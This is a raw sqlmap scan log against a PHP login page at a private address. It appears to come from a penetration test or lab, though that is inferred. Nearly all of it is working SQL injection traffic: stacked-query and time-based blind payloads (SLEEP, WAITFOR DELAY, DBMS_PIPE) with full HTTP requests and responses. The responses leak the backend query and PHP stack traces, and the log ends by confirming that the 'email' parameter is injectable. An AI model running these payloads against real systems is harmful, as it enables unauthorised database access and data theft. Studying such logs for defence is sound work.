Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%3BSELECT%20PG_SLEEP%285%29--&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:17:20] [DEBUG] skipping test 'PostgreSQL > 8.1 stacked queries' because the level (4) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'PostgreSQL stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'PostgreSQL stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'PostgreSQL < 8.2 stacked queries (Glibc - comment)' because the level (3) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'PostgreSQL < 8.2 stacked queries (Glibc)' because the level (5) is higher than the provided (1)
[03:17:20] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[03:17:20] [PAYLOAD] test@chatai.com);WAITFOR DELAY '0:0:5'--
[03:17:20] [TRAFFIC OUT] HTTP request [#43]:
GET /ai/includes/user_login.php?email=test%40chatai.com%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:21] [TRAFFIC IN] HTTP response [#43] (200 OK):
Date: Sun, 19 Oct 2025 07:17:21 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=781n4mkhq8lf5g7afhgtoogm9m; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:17:21] [PAYLOAD] test@chatai.com;WAITFOR DELAY '0:0:5'--
[03:17:21] [TRAFFIC OUT] HTTP request [#44]:
GET /ai/includes/user_login.php?email=test%40chatai.com%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:21] [TRAFFIC IN] HTTP response [#44] (200 OK):
Date: Sun, 19 Oct 2025 07:17:21 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=gaul2lmldkemdbotq4b8ni5g0j; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:17:21] [PAYLOAD] test@chatai.com');WAITFOR DELAY '0:0:5'--
[03:17:21] [TRAFFIC OUT] HTTP request [#45]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:21] [TRAFFIC IN] HTTP response [#45] (200 OK):
Date: Sun, 19 Oct 2025 07:17:21 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=3f28mta6lo0eqpo995ftu4nn7g; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:17:21] [PAYLOAD] test@chatai.com';WAITFOR DELAY '0:0:5'--
[03:17:21] [TRAFFIC OUT] HTTP request [#46]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:21] [TRAFFIC IN] HTTP response [#46] (200 OK):
Date: Sun, 19 Oct 2025 07:17:21 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=o4dt3ed3k1t1kda9dusj5roguc; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:17:21] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)' because the level (2) is higher than the provided (1)
[03:17:21] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries' because the level (4) is higher than the provided (1)
[03:17:21] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE)' because the level (5) is higher than the provided (1)
[03:17:21] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[03:17:21] [PAYLOAD] test@chatai.com);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(89)||CHR(106)||CHR(72)||CHR(69),5) FROM DUAL--
[03:17:21] [TRAFFIC OUT] HTTP request [#47]:
GET /ai/includes/user_login.php?email=test%40chatai.com%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%28106%29%7C%7CCHR%2872%29%7C%7CCHR%2869%29%2C5%29%20FROM%20DUAL--&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:21] [TRAFFIC IN] HTTP response [#47] (200 OK):
Date: Sun, 19 Oct 2025 07:17:21 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 196
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%28106%29%7C%7CCHR%2872%29%7C%7CCHR%2869%29%2C5%29%20FROM%20DUAL--&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(89)||CHR(106)||CHR(72)||CHR(69),5) FROM DUAL--'"
    ]
}
[03:17:21] [PAYLOAD] test@chatai.com;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(89)||CHR(106)||CHR(72)||CHR(69),5) FROM DUAL--
[03:17:21] [TRAFFIC OUT] HTTP request [#48]:
GET /ai/includes/user_login.php?email=test%40chatai.com%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%28106%29%7C%7CCHR%2872%29%7C%7CCHR%2869%29%2C5%29%20FROM%20DUAL--&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:21] [TRAFFIC IN] HTTP response [#48] (200 OK):
Date: Sun, 19 Oct 2025 07:17:21 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 195
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%28106%29%7C%7CCHR%2872%29%7C%7CCHR%2869%29%2C5%29%20FROM%20DUAL--&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(89)||CHR(106)||CHR(72)||CHR(69),5) FROM DUAL--'"
    ]
}
[03:17:21] [PAYLOAD] test@chatai.com');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(89)||CHR(106)||CHR(72)||CHR(69),5) FROM DUAL--
[03:17:21] [TRAFFIC OUT] HTTP request [#49]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%28106%29%7C%7CCHR%2872%29%7C%7CCHR%2869%29%2C5%29%20FROM%20DUAL--&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:21] [TRAFFIC IN] HTTP response [#49] (200 OK):
Date: Sun, 19 Oct 2025 07:17:21 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=me1omvah71d8a1nvqds039oaup; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%28106%29%7C%7CCHR%2872%29%7C%7CCHR%2869%29%2C5%29%20FROM%20DUAL--&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:17:21] [PAYLOAD] test@chatai.com';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(89)||CHR(106)||CHR(72)||CHR(69),5) FROM DUAL--
[03:17:21] [TRAFFIC OUT] HTTP request [#50]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%28106%29%7C%7CCHR%2872%29%7C%7CCHR%2869%29%2C5%29%20FROM%20DUAL--&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:21] [TRAFFIC IN] HTTP response [#50] (200 OK):
Date: Sun, 19 Oct 2025 07:17:22 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=1l1dri5obbf31qsqsonj0qkb2b; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%28106%29%7C%7CCHR%2872%29%7C%7CCHR%2869%29%2C5%29%20FROM%20DUAL--&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:17:21] [DEBUG] skipping test 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)' because the level (4) is higher than the provided (1)
[03:17:21] [DEBUG] skipping test 'Oracle stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
[03:17:21] [DEBUG] skipping test 'Oracle stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
[03:17:21] [DEBUG] skipping test 'Oracle stacked queries (DBMS_LOCK.SLEEP - comment)' because the level (4) is higher than the provided (1)
[03:17:21] [DEBUG] skipping test 'Oracle stacked queries (DBMS_LOCK.SLEEP)' because the level (5) is higher than the provided (1)
[03:17:21] [DEBUG] skipping test 'Oracle stacked queries (USER_LOCK.SLEEP - comment)' because the level (5) is higher than the provided (1)
[03:17:21] [DEBUG] skipping test 'Oracle stacked queries (USER_LOCK.SLEEP)' because the level (5) is higher than the provided (1)
[03:17:21] [DEBUG] skipping test 'IBM DB2 stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
[03:17:21] [DEBUG] skipping test 'IBM DB2 stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
[03:17:21] [DEBUG] skipping test 'SQLite > 2.0 stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
[03:17:21] [DEBUG] skipping test 'SQLite > 2.0 stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
[03:17:21] [DEBUG] skipping test 'Firebird stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
[03:17:21] [DEBUG] skipping test 'Firebird stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
[03:17:21] [DEBUG] skipping test 'SAP MaxDB stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
[03:17:21] [DEBUG] skipping test 'SAP MaxDB stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
[03:17:21] [DEBUG] skipping test 'HSQLDB >= 1.7.2 stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
[03:17:21] [DEBUG] skipping test 'HSQLDB >= 1.7.2 stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
[03:17:21] [DEBUG] skipping test 'HSQLDB >= 2.0 stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
[03:17:21] [DEBUG] skipping test 'HSQLDB >= 2.0 stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
[03:17:21] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[03:17:21] [PAYLOAD] test@chatai.com) AND (SELECT 9289 FROM (SELECT(SLEEP(5)))ihmY) AND (1137=1137
[03:17:21] [TRAFFIC OUT] HTTP request [#51]:
GET /ai/includes/user_login.php?email=test%40chatai.com%29%20AND%20%28SELECT%209289%20FROM%20%28SELECT%28SLEEP%285%29%29%29ihmY%29%20AND%20%281137%3D1137&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:21] [TRAFFIC IN] HTTP response [#51] (200 OK):
Date: Sun, 19 Oct 2025 07:17:22 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 173
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%29%20AND%20%28SELECT%209289%20FROM%20%28SELECT%28SLEEP%285%29%29%29ihmY%29%20AND%20%281137%3D1137&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com) AND (SELECT 9289 FROM (SELECT(SLEEP(5)))ihmY) AND (1137=1137'"
    ]
}
[03:17:21] [PAYLOAD] test@chatai.com AND (SELECT 9289 FROM (SELECT(SLEEP(5)))ihmY)
[03:17:21] [TRAFFIC OUT] HTTP request [#52]:
GET /ai/includes/user_login.php?email=test%40chatai.com%20AND%20%28SELECT%209289%20FROM%20%28SELECT%28SLEEP%285%29%29%29ihmY%29&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:21] [TRAFFIC IN] HTTP response [#52] (200 OK):
Date: Sun, 19 Oct 2025 07:17:22 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 157
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%20AND%20%28SELECT%209289%20FROM%20%28SELECT%28SLEEP%285%29%29%29ihmY%29&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com AND (SELECT 9289 FROM (SELECT(SLEEP(5)))ihmY)'"
    ]
}
[03:17:21] [PAYLOAD] test@chatai.com') AND (SELECT 9289 FROM (SELECT(SLEEP(5)))ihmY) AND ('qgRg'='qgRg
[03:17:21] [TRAFFIC OUT] HTTP request [#53]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%29%20AND%20%28SELECT%209289%20FROM%20%28SELECT%28SLEEP%285%29%29%29ihmY%29%20AND%20%28%27qgRg%27%3D%27qgRg&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:22] [TRAFFIC IN] HTTP response [#53] (200 OK):
Date: Sun, 19 Oct 2025 07:17:22 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=g30advhuu8ot8mt7vbg1majs8q; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%29%20AND%20%28SELECT%209289%20FROM%20%28SELECT%28SLEEP%285%29%29%29ihmY%29%20AND%20%28%27qgRg%27%3D%27qgRg&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:17:22] [PAYLOAD] test@chatai.com' AND (SELECT 9289 FROM (SELECT(SLEEP(5)))ihmY) AND 'AewC'='AewC
[03:17:22] [TRAFFIC OUT] HTTP request [#54]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20AND%20%28SELECT%209289%20FROM%20%28SELECT%28SLEEP%285%29%29%29ihmY%29%20AND%20%27AewC%27%3D%27AewC&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:32] [TRAFFIC IN] HTTP response [#54] (200 OK):
Date: Sun, 19 Oct 2025 07:17:22 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 175
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20AND%20%28SELECT%209289%20FROM%20%28SELECT%28SLEEP%285%29%29%29ihmY%29%20AND%20%27AewC%27%3D%27AewC&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' AND (SELECT 9289 FROM (SELECT(SLEEP(5)))ihmY) AND 'AewC'='AewC'"
    ]
}
[03:17:32] [PAYLOAD] test@chatai.com' AND (SELECT 9289 FROM (SELECT(SLEEP(0)))ihmY) AND 'AewC'='AewC
[03:17:32] [TRAFFIC OUT] HTTP request [#55]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20AND%20%28SELECT%209289%20FROM%20%28SELECT%28SLEEP%280%29%29%29ihmY%29%20AND%20%27AewC%27%3D%27AewC&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:32] [TRAFFIC IN] HTTP response [#55] (200 OK):
Date: Sun, 19 Oct 2025 07:17:32 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 175
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20AND%20%28SELECT%209289%20FROM%20%28SELECT%28SLEEP%280%29%29%29ihmY%29%20AND%20%27AewC%27%3D%27AewC&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' AND (SELECT 9289 FROM (SELECT(SLEEP(0)))ihmY) AND 'AewC'='AewC'"
    ]
}
[03:17:32] [PAYLOAD] test@chatai.com' AND (SELECT 9289 FROM (SELECT(SLEEP(5)))ihmY) AND 'AewC'='AewC
[03:17:32] [TRAFFIC OUT] HTTP request [#56]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20AND%20%28SELECT%209289%20FROM%20%28SELECT%28SLEEP%285%29%29%29ihmY%29%20AND%20%27AewC%27%3D%27AewC&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:42] [TRAFFIC IN] HTTP response [#56] (200 OK):
Date: Sun, 19 Oct 2025 07:17:32 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 175
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20AND%20%28SELECT%209289%20FROM%20%28SELECT%28SLEEP%285%29%29%29ihmY%29%20AND%20%27AewC%27%3D%27AewC&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' AND (SELECT 9289 FROM (SELECT(SLEEP(5)))ihmY) AND 'AewC'='AewC'"
    ]
}
[03:17:42] [INFO] GET parameter 'email' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 


for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[03:42:16] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (SLEEP)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (SLEEP)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL > 5.0.12 AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL > 5.0.12 OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL AND time-based blind (ELT)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL OR time-based blind (ELT)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL AND time-based blind (ELT - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL OR time-based blind (ELT - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'PostgreSQL > 8.1 AND time-based blind' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'PostgreSQL > 8.1 OR time-based blind' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'PostgreSQL > 8.1 AND time-based blind (comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'PostgreSQL > 8.1 OR time-based blind (comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'PostgreSQL AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'PostgreSQL OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'PostgreSQL AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'PostgreSQL OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind (IF)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind (IF - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Oracle AND time-based blind' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Oracle OR time-based blind' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Oracle AND time-based blind (comment)' because the payload for time-based blind has already been identified
